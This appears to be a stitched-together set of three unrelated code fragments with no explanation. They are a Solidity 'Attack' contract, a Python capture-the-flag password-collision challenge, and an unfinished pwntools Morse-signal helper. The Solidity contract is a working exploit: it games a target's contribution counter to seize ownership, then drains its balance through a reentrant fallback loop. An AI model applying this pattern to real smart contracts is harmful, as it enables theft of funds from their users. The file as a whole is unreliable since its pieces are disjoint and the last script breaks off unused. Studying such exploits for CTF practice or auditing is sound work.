contract Attack {
    Multipass public target;
    
    constructor(address _adress) public payable{
        target = Multipass(_adress);
        target.gift.value(0.00005 ether)();
    }
    
    function multiplyContributions() public {
        address contractAdress = address(this);
        
        while (target.contributions(contractAdress) <= target.contributions(target.owner())) {
            target.contribute(9);
        }
    }
    
    function takeOwnership() public returns(address){
        multiplyContributions();
        target.claimContract();
    }
    
    function attack() public {
        takeOwnership();
        target.takeSomeMoney();
    }
    
    function () payable public {
        while (!target.withdrawn()) {
            target.takeSomeMoney();
        }
    }
}

import string
import random

N = 8

def encode(pwd):
    def F(tmp):
        if tmp % 2:
            return (tmp % 26) + ord('A')
        else:
            r = tmp % 16
            if r < 10:
                return ord('0') + r
            else:
                return r - 10 + ord('A')

    a, res = 0, []
    for i in range(len(pwd)):
        P, c, S = pwd[:i], pwd[i], pwd[i+1:]
        S1, S2, T = sum(P), sum(S), sum(pwd)
        a = F((a + c) * i + T)
        res.append(a)

    return bytes(res)

def get_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length)).encode()

pwd = get_random_string(8)
enc = encode(pwd)

print(f'Can you find {N} different passwords that encode to "{enc.decode()}"?')

P = []
S = [enc]
try:
    for _ in range(N):
        p = input(">>> ").encode()
        if not p.isascii():
            print("Please enter only ASCII strings.")
            exit(1)
        P.append(p)
        S.append(encode(p))

    if len(set(P)) == N and len(set(S)) == 1:
        print("Congrats!! Here is your flag:")
        print(open("flag.txt").read())
    else:
        print("Nope!")
except:
    pass

from pwn import *
import numpy as np
import matplotlib.pyplot as plt
import base64

freq = 24000

def point(tab):
    for _ in range(freq // 1000):
        tab.append(1)
    for _ in range(freq // 1000):
        tab.append(0)

def dash(tab):
    for _ in range(5* freq // 1000):
        tab.append(1)
    for _ in range(freq // 1000):
        tab.append(0)

def next_letter(tab):
    for _ in range(4 * freq // 1000):
        tab.append(0)

def next_word(tab):
    for _ in range(19 * freq // 1000):
        tab.append(0)

def sentence_to_morse(sentence):
    tab = []
    for c in sentence:
        if c == '.':
            point(tab)
        elif c == '-':
            dash(tab)
        elif c == ' ':
            next_letter(tab)
        else:
            next_word(tab)
    return tab

